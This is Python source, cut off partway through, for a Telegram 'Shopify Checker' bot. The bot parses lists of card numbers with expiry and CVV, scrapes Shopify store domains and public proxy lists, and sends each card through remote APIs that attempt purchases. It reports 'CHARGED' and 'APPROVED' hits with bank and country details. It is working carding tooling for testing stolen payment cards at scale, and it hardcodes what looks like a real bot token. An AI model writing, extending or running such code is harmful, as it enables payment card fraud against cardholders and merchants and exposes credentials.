import os
import re
import io
import time
import json
import queue
import random
import threading
import requests
import telebot
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ==================== CONFIG ====================
BOT_TOKEN = "8832919810:AAEUPrjM8vpIq5L-3p_CNqlp9BYbrfjT6Jk"
ADMIN_ID = 6566026385

API_FILE = "apis.json"
PROXY_FILE = "proxies.json"
SITE_FILE = "sites.json"
USER_FILE = "users.json"

bot = telebot.TeleBot(BOT_TOKEN)

try:
    bot_info = bot.get_me()
    CREDIT = f"@{bot_info.username}" if bot_info.username else "@ZYELEO"
except Exception:
    CREDIT = "@ZYELEO"

# ==================== GLOBAL STOP EVENTS ====================
STOP_CHECKER = threading.Event()
STOP_PROXY_CHECK = threading.Event()
STOP_SCRAPE = threading.Event()

# ==================== STATE MANAGEMENT ====================
def load_json(file, default=[]):
    if os.path.exists(file):
        try:
            with open(file, 'r') as f:
                data = json.load(f)
                if data: return list(dict.fromkeys(data))
        except: pass
    return list(dict.fromkeys(default))

def save_json(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

API_BASES = load_json(API_FILE, [
    "https://shpiapi9.onrender.com",
    "https://shpiapi8.onrender.com",
    "https://shpiapi7.onrender.com",
    "https://shpiapi6.onrender.com",
    "https://shpiapi5.onrender.com",
    "https://shpiapi4.onrender.com",
    "https://shpiapi3.onrender.com",
    "https://shpiapi-2.onrender.com",
    "https://shpiapi-1.onrender.com",
    "https://shopify-api-b6yt.onrender.com"
])

PROXIES = load_json(PROXY_FILE, [])
SITES = load_json(SITE_FILE, ["yeezy.com", "skims.com"])
USERS = load_json(USER_FILE, [])

api_idx = 0
proxy_idx = 0
site_idx = 0
user_states = {}
pending_files = {}

# ==================== ROLE HELPERS ====================
def is_admin(uid):
    return uid == ADMIN_ID

def track_user(uid):
    """Record a user the first time they interact. Only admins can see this list."""
    if uid == ADMIN_ID:
        return
    if uid not in USERS:
        USERS.append(uid)
        save_json(USER_FILE, USERS)

# ==================== ANIMATION FRAMES ====================
SPINNER = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
PULSE = ["🟢", "🟡", "🟠", "🔵", "🟣", "🟢"]
FIRE = ["🔥", "🔥", "💥", "🔥", "✨"]

def get_next_api():
    global api_idx
    if not API_BASES: return None
    url = API_BASES[api_idx % len(API_BASES)]
    api_idx += 1
    return url.rstrip("/")

def get_next_proxy():
    global proxy_idx
    if not PROXIES: return None
    p = PROXIES[proxy_idx % len(PROXIES)]
    proxy_idx += 1
    return p

def get_next_site():
    global site_idx
    if not SITES: return "yeezy.com"
    site = SITES[site_idx % len(SITES)]
    site_idx += 1
    return site

def parse_combos(text):
    pattern = re.compile(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[|:,]\s*(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    combos = set()
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        m = pattern.search(line)
        if m:
            combos.add((m.group(1).lower(), m.group(2)))
        else:
            card_match = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', line)
            if card_match:
                combos.add(("RANDOM_SITE", card_match.group(1)))
    return list(combos)

# ==================== BIN LOOKUP ====================
def get_bin_info(cc):
    try:
        bin_num = cc[:6]
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={"Accept-Version": "3"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            scheme = data.get("scheme", "UNKNOWN").upper()
            type_ = data.get("type", "UNKNOWN").upper()
            level = data.get("brand", "UNKNOWN").upper()
            bank = data.get("bank", {}).get("name", "UNKNOWN").upper()
            country_name = data.get("country", {}).get("name", "UNKNOWN").upper()
            country_emoji = data.get("country", {}).get("emoji", "🏳️")
            return f"{scheme} - {type_} - {level}", bank, f"{country_name} {country_emoji}"
    except: pass
    return "-", "-", "-"

# ==================== FORMAT GENERATOR ====================
def generate_hit_message(combo, site, res_code, price, gate, proxy="None", product="-"):
    bin_info, bank, country = get_bin_info(combo)

    if res_code == "ORDER_PAID":
        title = "🔥 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎"
    elif res_code == "INSUFFICIENT_FUNDS":
        title = "💳 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 ✅"
    elif res_code == "APPROVED":
        title = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    else:
        title = f"🔥 {res_code}"

    style = random.randint(1, 3)

    if style == 1:
        return (
            f"{title}\n\n"
            f"[💎] 𝖢𝖺𝗋𝖽 - `{combo}`\n"
            f"[💎] 𝖦𝖺𝗍𝖾𝗐𝖺𝗒 - {gate}\n"
            f"[💎] 𝖯𝗋𝗈𝖽𝗎𝖼𝗍 - {product}\n"
            f"[💎] 𝖠𝗆𝗈𝗎𝗇𝗍 - {price}$\n"
            f"[💎] 𝖱𝖾𝗌𝗉𝗈𝗇𝗌𝖾 - {res_code}\n"
            f"[💎] 𝖲𝗂𝗍𝖾 - {site}\n"
            f"[💎] 𝖯𝗋𝗈𝗑𝗒 - {proxy}\n\n"
            f"[🔎] 𝖡𝗂𝗇 - {bin_info}\n"
            f"[🔎] 𝖡𝖺𝗇𝗄 - {bank}\n"
            f"[🔎] 𝖢𝗈𝗎𝗇𝗍𝗋𝗒 - {country}\n\n"
            f"👾 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 ➜ {CREDIT} ✅"
        )
    elif style == 2:
        return (
            f"{title}\n"
            "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
            f"💳 `{combo}`\n"
            "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
            f"ᴘʀᴏᴅᴜᴄᴛ {product}\n"
            f"ᴀᴍᴏᴜɴᴛ ${price} 💸\n"
            f"ɢᴀᴛᴇ {gate}\n"
            f"ꜱɪᴛᴇ {site}\n"
            f"ᴘʀᴏxʏ {proxy}\n"
            f"ʙɪɴ {bin_info}\n"
            f"ʙᴀɴᴋ {bank} 💳\n"
            f"ᴄᴏᴜɴᴛʀʏ {country}\n"
            f"ʀᴇѕᴘᴏɴѕᴇ {res_code}\n"
            "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
            f"ᴄʜᴇᴄᴋᴇʀ {CREDIT} 👤"
        )
    else:
        return (
            f"{title}\n"
            "━━━━━━━━━━━━━━━\n"
            f"Card ━ `{combo}`\n"
            f"Gateway ━ {gate}\n"
            f"Product ━ {product}\n"
            f"Response ━ {res_code}\n"
            f"Price ━ ${price}\n"
            f"Site ━ {site}\n"
            f"Proxy ━ {proxy}\n"
            "━━━━━━━━━━━━━━━\n"
            f"BIN: {bin_info}\n"
            f"Bank: {bank}\n"
            f"Country: {country}\n\n"
            f"💠 {CREDIT}"
        )

# ==================== PROXY CHECKER — RICH ====================
PROXY_TYPE_ICONS = {"HTTP": "🌐", "HTTPS": "🔒", "SOCKS4": "🧦", "SOCKS5": "🧦"}

def _geo_lookup(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,countryCode", timeout=4)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success" and d.get("countryCode"):
                cc = d["countryCode"].upper()
                flag = "".join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc if 'A' <= c <= 'Z')
                return cc, flag if flag else "🏳️"
    except: pass
    return "??", "🏳️"

def _normalize_proxy(proxy):
    raw = proxy.strip()
    m = re.match(r"^(\w+)://(.+)$", raw)
    if m:
        scheme = m.group(1).lower()
        host = m.group(2)
    else:
        scheme = "http"
        host = raw
    ip_port = host.split("@")[-1]
    if ":" not in ip_port:
        return scheme, None, None, None
    ip, port = ip_port.rsplit(":", 1)
    if not port.isdigit():
        return scheme, None, None, None
    scheme_map = {"http": "http", "https": "https", "socks4": "socks4", "socks5": "socks5"}
    scheme = scheme_map.get(scheme, "http")
    return scheme, f"{scheme}://{host}", ip, int(port)

def check_single_proxy(proxy, timeout=6):
    scheme, proxy_url, ip, port = _normalize_proxy(proxy)
    if not proxy_url:
        return None
    schemes_to_try = [scheme]
    if scheme == "http":
        schemes_to_try += ["socks5", "socks4"]
    for try_scheme in schemes_to_try:
        try_url = f"{try_scheme}://{proxy_url.split('://', 1)[1]}"
        try:
            t0 = time.time()
            r = requests.get("http://ip-api.com/json/?fields=status,query",
                             proxies={"http": try_url, "https": try_url}, timeout=timeout)
            latency = int((time.time() - t0) * 1000)
            if r.status_code == 200 and r.json().get("status") == "success":
                ip_out = r.json().get("query", ip)
                cc, flag = _geo_lookup(ip_out)
                return {"proxy": proxy, "scheme": try_scheme.upper(), "ip": ip, "port": port,
                        "latency": latency, "country": cc, "flag": flag, "alive": True}
        except: continue
    return None

def _format_proxy_line(e):
    icon = PROXY_TYPE_ICONS.get(e["scheme"], "🌐")
    return (f"🌍 `{e['ip']}:{e['port']}`\n"
            f"      {icon} **{e['scheme']}** • ⚡ {e['latency']}ms • {e.get('flag','🏳️')} **{e.get('country','??')}**")

def proxy_check_thread(msg, proxies_to_check):
    STOP_PROXY_CHECK.clear()
    total = len(proxies_to_check)
    if total == 0:
        bot.edit_message_text("❌ No proxies to check.", chat_id=msg.chat.id, message_id=msg.message_id)
        return
    alive, dead, done = [], 0, 0
    lock = threading.Lock()
    start = time.time()

    def progress_text():
        pct = int((done / total) * 100) if total else 0
        bar = "█" * int(pct / 10) + "░" * (10 - int(pct / 10))
        return (f"🔍 **Checking Proxies**\n──────────────────────\n"
                f"📊 `[{bar}]` {pct}%\n"
                f"📥 {done}   ✅ {len(alive)}   ❌ {dead}\n"
                f"⏱️ {time.time()-start:.1f}s\n──────────────────────\n💠 {CREDIT}")

    def worker(proxy):
        nonlocal done, dead
        if STOP_PROXY_CHECK.is_set(): return
        res = check_single_proxy(proxy)
        with lock:
            done += 1
            if res: alive.append(res)
            else: dead += 1
            if done % 25 == 0 or done == total:
                try: bot.edit_message_text(progress_text(), chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
                except: pass

    with ThreadPoolExecutor(max_workers=50) as ex:
        list(ex.map(worker, proxies_to_check))

    alive.sort(key=lambda x: x["latency"])
    global PROXIES
    PROXIES = [a["proxy"] for a in alive]
    save_json(PROXY_FILE, PROXIES)

    elapsed = time.time() - start
    header = (f"🚀 **Check results**  •  {elapsed:.1f}s\n──────────────────────\n"
              f"📥 {total}   ✅ {len(alive)}   ❌ {dead}\n──────────────────────\n")
    if not alive:
        bot.edit_message_text(header + "\n❌ _No alive proxies._\n\n💠 " + CREDIT,
                              chat_id=msg.chat.id, message_id=msg.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown')
        return

    PAGE = 20
    pages = [alive[i:i+PAGE] for i in range(0, len(alive), PAGE)]
    first = [header] + [_format_proxy_line(e) for e in pages[0]]
    if len(pages) > 1: first.append(f"\n… +{len(alive)-PAGE}")
    first.append(f"\n💠 {CREDIT}")
    try:
        bot.edit_message_text("\n".join(first), chat_id=msg.chat.id, message_id=msg.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown')
    except: pass
    for idx, page in enumerate(pages[1:], 2):
        lines = [f"📄 **Page {idx}/{len(pages)}**\n"] + [_format_proxy_line(e) for e in page] + [f"\n💠 {CREDIT}"]
        try:
            bot.send_message(msg.chat.id, "\n".join(lines), parse_mode='Markdown'); time.sleep(0.4)
        except: pass

# ==================== AUTO SCRAPER — PROXIES ====================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
]
PROXY_LINE = re.compile(r'^(\d{1,3}\.){3}\d{1,3}:\d{2,5}$')

def scrape_proxies_thread(msg):
    STOP_SCRAPE.clear()
    bot.edit_message_text("🕷️ **Scraping Proxies…**\nfetching from public sources…",
                          chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
    found = set(); sources_ok = 0
    for i, src in enumerate(PROXY_SOURCES):
        if STOP_SCRAPE.is_set(): break
        try:
            r = requests.get(src, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                sources_ok += 1
                for line in r.text.splitlines():
                    line = line.strip()
                    if PROXY_LINE.match(line): found.add(line)
        except: pass
        if i % 3 == 0:
            try: bot.edit_message_text(f"🕷️ **Scraping Proxies…**\n\nsources: {i+1}/{len(PROXY_SOURCES)}\nfound: `{len(found)}`",
                                        chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
            except: pass
    global PROXIES
    before = len(PROXIES)
    for p in found:
        if p not in PROXIES: PROXIES.append(p)
    added = len(PROXIES) - before
    save_json(PROXY_FILE, PROXIES)
    bot.edit_message_text(f"🕷️ **Scrape Done**\n──────────────────────\n"
                          f"📡 Sources hit: `{sources_ok}/{len(PROXY_SOURCES)}`\n"
                          f"🆕 New proxies: `{added}`\n📦 Total: `{len(PROXIES)}`\n"
                          f"──────────────────────\n💡 Run **Check All** next.\n\n💠 {CREDIT}",
                          chat_id=msg.chat.id, message_id=msg.message_id,
                          reply_markup=proxy_menu(), parse_mode='Markdown')

# ==================== AUTO SCRAPER — SITES ====================
SHOPIFY_SITE_SOURCES = [
    "https://raw.githubusercontent.com/KingBogdan/Shopify-Store-Scraper/main/domains.txt",
    "https://raw.githubusercontent.com/github-things/shopify-stores-list/main/shops.txt",
    "https://raw.githubusercontent.com/farukalamai/shopify-shops/main/websites.txt",
]
SHOPIFY_HOST = re.compile(r'^([a-z0-9-]+)\.myshopify\.com$', re.IGNORECASE)
PLAIN_DOMAIN = re.compile(r'^[a-z0-9-]+(\.[a-z0-9-]+)+$', re.IGNORECASE)

def scrape_sites_thread(msg, max_add=200):
    STOP_SCRAPE.clear()
    bot.edit_message_text("🕷️ **Scraping Shopify Sites…**\nscanning public lists…",
                          chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
    found = set()
    for src in SHOPIFY_SITE_SOURCES:
        if STOP_SCRAPE.is_set(): break
        try:
            r = requests.get(src, timeout=20, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip().lower()
                    if not line or line.startswith("#"): continue
                    if SHOPIFY_HOST.match(line): found.add(line)
                    elif PLAIN_DOMAIN.match(line) and not any(x in line for x in ("github.com","raw.","google.","amazon.")):
                        found.add(line)
        except: pass
    global SITES
    before = len(SITES); added = 0
    for s in found:
        if len(SITES) >= before + max_add: break
        if s not in SITES: SITES.append(s); added += 1
    save_json(SITE_FILE, SITES)
    bot.edit_message_text(f"🕷️ **Site Scrape Done**\n──────────────────────\n"
                          f"🆕 New sites: `{added}`\n📦 Total: `{len(SITES)}`\n"
                          f"──────────────────────\n💠 {CREDIT}",
                          chat_id=msg.chat.id, message_id=msg.message_id,
                          reply_markup=site_menu(), parse_mode='Markdown')

# ==================== MULTI-WORKER ENGINE ====================
def api_worker(api_url, combo_queue, msg, progress_lock, stats, use_proxy):
    session = requests.Session()
    while not STOP_CHECKER.is_set():
        try: site, combo = combo_queue.get_nowait()
        except queue.Empty: break
        url = f"{api_url}/shopii"
        payload = {"site": site, "cc": combo}
        proxy = "None"
        if use_proxy:
            p = get_next_proxy()
            if p: proxy = p; payload["proxy"] = p
        result = {}; r = None
        try:
            r = session.post(url, json=payload, timeout=45)
            if r.status_code == 200:
                result = r.json()
                res = result.get("Response", "").upper()
                price = result.get("Price", "0.00")
                gate = result.get("Gateway", "shopify_payments")
            else:
                res = f"HTTP_{r.status_code}"; price = "0.00"; gate = "unknown"
        except:
            res = "TIMEOUT"; price = "0.00"; gate = "unknown"
        product = "-"
        for key in ("Product","product","Item","item","Name","name","Title","title"):
            val = result.get(key)
            if val: product = str(val); break
        with progress_lock:
            stats['checked'] += 1
            is_hit = res in ("ORDER_PAID","CHARGED","INSUFFICIENT_FUNDS","APPROVED")
            short_card = combo[:6] + "••••" + combo[-4:]
            site_short = site[:15] + "..." if len(site) > 18 else site
            if is_hit:
                line = f"{random.choice(FIRE)} `{site_short}` ┃ {product[:18]} ┃ ${price} ┃ ✅ {res}"
            else:
                line = f"{random.choice(['▪️','▫️','▪️'])} `{site_short}` ┃ {product[:18]} ┃ ${price} ┃ ❌ {res[:8]}"
            stats['recent'].append(line)
            if len(stats['recent']) > 8: stats['recent'].pop(0)
            if is_hit:
                stats['hits'] += 1
                stats['hits_lines'].append(f"{site} | {combo} | {res} | {price}$ | {product} | Proxy: {proxy}\n")
                hit_msg = generate_hit_message(combo, site, res, price, gate, proxy, product)
                try:
                    sent_msg = bot.send_message(msg.chat.id, hit_msg, parse_mode='Markdown')
                    if res in ("ORDER_PAID","CHARGED"):
                        try: bot.pin_chat_message(msg.chat.id, sent_msg.message_id)
                        except: pass
                except: pass
            else:
                stats['bad'] += 1
        combo_queue.task_done()

def process_bulk_thread(msg, combos, use_proxy):
    STOP_CHECKER.clear()
    total = len(combos)
    combo_queue = queue.Queue()
    for s, c in combos:
        if s == "RANDOM_SITE": combo_queue.put((get_next_site(), c))
        else: combo_queue.put((s, c))
    stats = {'checked':0,'hits':0,'bad':0,'hits_lines':[],'recent':[]}
    progress_lock = threading.Lock()
    start_time = time.time()
    unique_apis = list(dict.fromkeys(API_BASES))
    max_workers = min(len(unique_apis), len(combos))
    threads = []
    for i in range(max_workers):
        api_url = unique_apis[i].rstrip("/")
        t = threading.Thread(target=api_worker, args=(api_url, combo_queue, msg, progress_lock, stats, use_proxy))
        t.daemon = True; t.start(); threads.append(t)
    last_update = time.time(); frame_idx = 0
    while any(t.is_alive() for t in threads):
        time.sleep(0.9)
        if STOP_CHECKER.is_set(): break
        now = time.time()
        if now - last_update > 2.0:
            last_update = now; frame_idx += 1
            with progress_lock:
                checked = stats['checked']
                pct = int((checked / total) * 100) if total > 0 else 0
                bar = "█" * int(pct/10) + "░" * (10 - int(pct/10))
                elapsed = int(now - start_time)
                cpm = int(checked / (elapsed/60)) if elapsed > 0 else 0
                spin = SPINNER[frame_idx % len(SPINNER)]
                pulse = PULSE[frame_idx % len(PULSE)]
                mode_str = "🌐 Proxy" if use_proxy else "🚀 Direct"
                recent_block = "\n".join(stats['recent']) if stats['recent'] else "`warming up engines...`"
                text = (f"╔═══ {spin} **LIVE FEED** {pulse} ═══╗\n"
                        f"   {mode_str} ┃ ⚡ {cpm:,} CPM\n╠═══════════════════════╣\n"
                        f"  📊 `[{bar}]` {pct}%\n  📦 {checked:,} / {total:,}\n"
                        f"  ✅ Hits: **{stats['hits']:,}** ┃ ❌ Bad: **{stats['bad']:,}**\n"
                        f"  ⏱️ {elapsed}s ┃ 👷 {max_workers} workers\n"
                        f"╠═══ 🧾 **RECENT CHECKS** ═══╣\n{recent_block}\n"
                        f"╚═══════════════════════╝\n💠 {CREDIT}")
                try: bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
                except: pass
    if STOP_CHECKER.is_set():
        summary = f"🛑 **Stopped**\n\nChecked: `{stats['checked']:,}/{total:,}`\nHits: `{stats['hits']:,}`"
    else:
        summary = (f"✅ **Done!** 🎉\n\nTotal: `{total:,}`\nHits: `{stats['hits']:,}`\nBad: `{stats['bad']:,}`\n\n💠 {CREDIT}")
    try: bot.edit_message_text(summary, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
    except: pass
    if stats['hits'] > 0:
        bot.send_document(msg.chat.id, (f"hits_{int(time.time())}.txt", "".join(stats['hits_lines']).encode()),
                          caption=f"🔥 **{stats['hits']:,} Hits**\n💠 {CREDIT}", parse_mode='Markdown')

# ==================== SINGLE CHECK WORKER ====================
def single_check_thread(message, combo_data):
    site, combo = combo_data
    if site == "RANDOM_SITE": site = get_next_site()
    msg = bot.reply_to(message, f"🔍 Checking `{site}`...", parse_mode='Markdown')
    api = API_BASES[0].rstrip("/")
    url = f"{api}/shopii"
    result = {}
    try:
        r = requests.post(url, json={"site": site, "cc": combo}, timeout=45)
        result = r.json() if r.status_code == 200 else {"Response": f"HTTP_{r.status_code}"}
    except:
        result = {"Response": "TIMEOUT"}
    res = result.get("Response", "ERROR").upper()
    price = result.get("Price", "0.00")
    gate = result.get("Gateway", "shopify_payments")
    product = "-"
    for key in ("Product","product","Item","item","Name","name","Title","title"):
        val = result.get(key)
        if val: product = str(val); break
    is_hit = res in ("ORDER_PAID","CHARGED","INSUFFICIENT_FUNDS","APPROVED")
    if is_hit:
        hit_msg = generate_hit_message(combo, site, res, price, gate, proxy="None", product=product)
        sent_msg = bot.edit_message_text(hit_msg, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
        if res in ("ORDER_PAID","CHARGED"):
            try: bot.pin_chat_message(msg.chat.id, sent_msg.message_id)
            except: pass
    else:
        text = f"❌ **Declined**\n💳 `{combo}`\n🏪 {site}\n📦 {product}\n💵 ${price}\n📝 {res}\n\n💠 {CREDIT}"
        bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

# ==================== USER MENU (NORMAL) ====================
def user_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🛠 How to Use", callback_data="user_help"))
    return markup

# ==================== ADMIN MENUS ====================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚙️ APIs", callback_data="menu_api"),
        types.InlineKeyboardButton("🌐 Proxies", callback_data="menu_proxy"),
        types.InlineKeyboardButton("🏪 Sites", callback_data="menu_site"),
        types.InlineKeyboardButton("📊 Stats", callback_data="menu_stats")
    )
    markup.add(types.InlineKeyboardButton("👥 Users", callback_data="menu_users"))
    markup.add(types.InlineKeyboardButton("🛠 How to Use", callback_data="menu_help"))
    return markup

def proxy_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📤 Upload TXT", callback_data="proxy_upload"),
        types.InlineKeyboardButton("🔍 Check All", callback_data="proxy_check")
    )
    markup.add(
        types.InlineKeyboardButton("🕷️ Auto Scrape", callback_data="proxy_scrape"),
        types.InlineKeyboardButton("🧹 Clear All", callback_data="proxy_clear")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return markup

def site_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add Site", callback_data="site_add"),
        types.InlineKeyboardButton("📜 List Sites", callback_data="site_list")
    )
    markup.add(
        types.InlineKeyboardButton("🕷️ Auto Scrape", callback_data="site_scrape"),
        types.InlineKeyboardButton("🧹 Clear All", callback_data="site_clear")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return markup

def api_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add API", callback_data="api_add"),
        types.InlineKeyboardButton("📜 List APIs", callback_data="api_list")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return markup

def users_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return markup

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def start(message):
    uid = message.from_user.id
    track_user(uid)
    if is_admin(uid):
        text = (
            "👑 **Admin Dashboard**\n\n"
            "**Commands:**\n"
            "• `/chk cc|mm|yy|cvv` → Random saved site\n"
            "• `/chk site.com | cc|mm|yy|cvv` → Specific site\n"
            "• Reply to `.txt` with `/chk` → Bulk check\n"
            "• `/stop` → Stop bulk check\n"
            "• `/stopscrape` → Stop scrape\n"
            "• `/stopcheck` → Stop proxy check\n"
            "• `/admin` → Admin panel\n\n"
            "⚙️ **Full control available below.**"
        )
        bot.reply_to(message, text, reply_markup=main_menu(), parse_mode='Markdown')
    else:
        text = (
            "🛍️ **Shopify Checker Bot**\n\n"
            "**Commands:**\n"
            "• `/chk cc|mm|yy|cvv` → Auto-pick a random site\n"
            "• `/chk site.com | cc|mm|yy|cvv` → Target a specific site\n"
            "• Reply to `.txt` with `/chk` → Bulk check\n"
            "• `/stop` → Stop running check\n\n"
            "💠 Powered by " + CREDIT
        )
        bot.reply_to(message, text, reply_markup=user_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    bot.reply_to(message, "👑 **Admin Dashboard**", reply_markup=main_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def stop_bot(message):
    STOP_CHECKER.set()
    bot.reply_to(message, "🛑 **Stop signal sent.** Workers are shutting down...", parse_mode='Markdown')

@bot.message_handler(commands=['stopscrape'])
def stop_scrape(message):
    if not is_admin(message.from_user.id):
        return
    STOP_SCRAPE.set()
    bot.reply_to(message, "🛑 **Scrape stop signal sent.**", parse_mode='Markdown')

@bot.message_handler(commands=['stopcheck'])
def stop_check(message):
    if not is_admin(message.from_user.id):
        return
    STOP_PROXY_CHECK.set()
    bot.reply_to(message, "🛑 **Proxy check stop signal sent.**", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global SITES, API_BASES, PROXIES, USERS
    data = call.data
    uid = call.from_user.id

    track_user(uid)

    # === USER-ONLY CALLBACKS ===
    if data == "user_help":
        text = (
            "🛠 **How to Use**\n\n"
            "**Single check:**\n"
            "`/chk 4111111111111111|12|2030|123`\n"
            "→ Picks a random saved site.\n\n"
            "**Targeted check:**\n"
            "`/chk shop.com | 4111111111111111|12|2030|123`\n\n"
            "**Bulk check:**\n"
            "Send a `.txt` file with one combo per line, "
            "reply to it with `/chk`.\n\n"
            "**Stop:** `/stop`\n\n"
            f"💠 {CREDIT}"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=user_menu(), parse_mode='Markdown')
        return

    # === ADMIN GATE — everything below is admin only ===
    if not is_admin(uid):
        bot.answer_callback_query(call.id, "❌ Admin only.")
        return

    if data == "menu_main":
        bot.edit_message_text("👑 **Admin Dashboard**", call.message.chat.id, call.message.message_id,
                              reply_markup=main_menu(), parse_mode='Markdown')
    elif data == "menu_help":
        text = (
            "🛠 **Admin Help**\n\n"
            "**Commands:**\n"
            "• `/chk cc|mm|yy|cvv` — random site\n"
            "• `/chk site.com | cc|mm|yy|cvv` — specific\n"
            "• Reply `.txt` + `/chk` — bulk\n"
            "• `/stop` — stop bulk\n"
            "• `/stopscrape` — stop scrape\n"
            "• `/stopcheck` — stop proxy check\n"
            "• `/admin` — this panel\n\n"
            f"💠 {CREDIT}"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=main_menu(), parse_mode='Markdown')

    elif data == "menu_users":
        if USERS:
            preview = "\n".join([f"{i+1}. `{u}`" for i, u in enumerate(USERS[:40])])
            extra = f"\n\n… and {len(USERS)-40} more" if len(USERS) > 40 else ""
            text = f"👥 **Users** (total {len(USERS)}):\n\n{preview}{extra}\n\n💠 {CREDIT}"
        else:
            text = "👥 **Users**\n\nNo users yet.\n\n💠 " + CREDIT
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=users_menu(), parse_mode='Markdown')

    # ===== SITES =====
    elif data == "menu_site":
        bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `{len(SITES)}`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_add":
        user_states[uid] = "awaiting_site"
        bot.edit_message_text("➕ **Send site URL**", call.message.chat.id, call.message.message_id,
                              reply_markup=types.InlineKeyboardMarkup().add(
                                  types.InlineKeyboardButton("❌ Cancel", callback_data="menu_site")))
    elif data == "site_list":
        if SITES:
            preview = "\n".join([f"{i+1}. `{s}`" for i, s in enumerate(SITES[:50])])
            extra = f"\n\n… and {len(SITES)-50} more" if len(SITES) > 50 else ""
            text = f"📜 **Saved Sites** (total {len(SITES)}):\n\n{preview}{extra}"
        else:
            text = "❌ No sites saved."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_clear":
        SITES = []; save_json(SITE_FILE, SITES)
        bot.answer_callback_query(call.id, "✅ Sites Cleared!")
        bot.edit_message_text("🏪 **Site Manager**\nSaved Sites: `0`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_scrape":
        bot.answer_callback_query(call.id, "🕷️ Scraping…")
        threading.Thread(target=scrape_sites_thread, args=(call.message,), daemon=True).start()

    # ===== PROXIES =====
    elif data == "menu_proxy":
